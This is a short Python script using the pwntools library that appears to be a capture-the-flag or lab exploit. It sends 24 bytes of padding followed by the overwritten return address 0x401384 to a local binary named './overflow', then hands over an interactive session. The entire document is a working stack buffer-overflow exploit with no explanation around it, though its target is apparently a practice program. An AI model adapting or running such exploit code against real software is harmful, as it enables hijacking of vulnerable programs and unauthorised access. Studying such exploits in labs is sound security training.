from pwn import *

target = p64(0x401384)

pad = b'a'*24


payload = pad + target

p = process('./overflow')
p.sendline(payload)
p.interactive()
